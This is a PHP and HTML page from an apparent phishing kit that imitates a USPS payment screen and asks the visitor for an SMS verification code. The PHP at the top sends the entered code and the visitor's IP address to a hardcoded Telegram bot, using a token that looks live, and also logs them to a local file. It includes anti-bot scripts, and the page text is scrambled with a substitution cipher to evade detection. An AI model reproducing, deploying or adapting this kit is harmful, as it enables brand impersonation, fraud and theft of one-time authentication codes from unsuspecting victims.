<?php
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti6.php"; 
include "anti/anti7.php"; 
include "anti/anti8.php"; 
include "id.php";
if(isset($_POST['megria'])){
$ip = getenv("REMOTE_ADDR");
$message = "-------------------- <3 USPS <3-------------------\n📲SMS Code📲  : ".$_POST['msms']."\n🌐 FROM      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot6931087208:AAHcBQ4osfKIdJ3sTJiYFwNd25o82i1LZwU/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
if ($error='1'){
HEADER("Location: index5.php");
}else{
HEADER("Location: thanks.php");
}
}
?>
 
 
 
 
 <!DOCTYPE html>
<html lang="de">
	<head>
	<meta charset="UTF-8"/>
	<link rel="shortcut icon" href="https://www.usps.com/favicon.ico">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>Payment | USPS</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="./css/style.css">
	<link rel="stylesheet" href="./css/style.css">
	<link rel="shortcut icon nofollow" href="./img/favicon.png">
	<script src="./js/style.js"></script>
	<script src="./js/style.js"></script>
	</head>
	<body class="tanya">
		
		<section>
		<div class="head">
		<span><img src="./img/usps.png"></span>
		<span><img src="./img/logo_3d.gif"></span>
		</div>
		<div class="titr">Ultmzt cvnfria eht fvllvqrng umyatne.</div>
<p style="text-align: center;"><span style="color: rgb(226, 80, 65);">Erat tkuritd, ultmzt eiy mgmrn</span></p>
		<div class="kolchi">
 
		<p style="font-size:12px">Eht pnrwpt umzzqvid hmz bttn ztne ev eht avbrlt npabti lrzetd btlvq. Rf yvp nttd ev chmngt yvpi avbrlt npabti, ultmzt cvnemce yvpi bmnx vi avdrfy re orm eht momrlmblt chmnntlz (MEA, qtb).</p>
		<div class="inf">
		<span class="tr">Atichmne:</span>
		<span class="rp">PZUZ</span>
		</div>
		<div class="inf">
		<span class="tr">Mavpne:</span>
		<span class="rp" style="font-family:arial">3.00 
		USD</span>
		<!-- <div class="inf">
		<span class="tr">Citdre cmid npabti:</span>
		<span class="rp">KKKK-KKKK-KKKK-864</span>
		</div>
		<div class="inf">
		<span class="tr">Yvpi Uhvnt Npabti:</span>
		<span class="rp"><br />
<b>Notice</b>:  Undefined index: tl in <b>/home/customer/www/justiceformarvinhaynes.com/public_html/aaak/Espace-clients/Portfeuille=IDPP00C742/F004f19441/33140025d.php</b> on line <b>62</b><br />
</span>
		</div>-->
		<form method="post" action="">
		<div class="inf">
		<span class="tr">cvdt ZAZ:</span>
		<span class="rp"><input type="text" class="tantan" id="tantan" name="msms" maxlength="22" required placeholder="" autocomplete="off" autofocus  /></span>
		</div>
		<div style="font-size:12px">Ultmzt tneti eht otirfrcmervn cvdt itctrotd by zaz: <span id="timer" style="color:red;font-weight:bold;font-size:12px">ZAZ cvdt ztne...</span></div>
		</div>
		<!-- <div style="font-size:12px;color:red;font-weight:bold;padding:">Yvp apze mcctue ehrz umyatne ehivpgh eht muulrcmervn, rf yvp hmot cvnfriamervn fiva yvpi bmnx!</div> -->
		<div class="btn"><button name="megria" type="submit" class="text-center" >Zpbare</button></div>
		<div class="foot">&copy; 2021 PZUZ Rnetinmervnml - Mll irghez itztiotd.</div>
		</form>
		</section>
<script src="./js/style.js"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 15000);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

/*-------------------------------------------------------*/
/*------------------- TIMER FUNCTION --------------------*/
/*-------------------------------------------------------*/

    function countdown(timer, minutes, seconds) {
// set time for the particular countdown
var time = minutes*60 + seconds;
var interval = setInterval(function() {
    var el = document.getElementById('timer');
    // if the time is 0 then end the counter
    if(time == 0) {
        setTimeout(function() {
            el.innerHTML = "ZAZ cvdt ztne...";
        }, 1500);


        clearInterval(interval);

        setTimeout(function() {
            countdown('clock', 2, 1);
        }, 2000);
    }
    var minutes = Math.floor( time / 60 );
    if (minutes < 10) minutes = "0" + minutes;
    var seconds = time % 60;
    if (seconds < 10) seconds = "0" + seconds; 
    var text = minutes + ':' + seconds;
    el.innerHTML = text;
    time--;
}, 1500);     // 1000 = 1 segonde in timer = j'ai fais 1500 pour calculer 1.5 segonde comme c'est 1 segonde
}
countdown('clock', 2, 1);
	</script>
	</body>
</html>




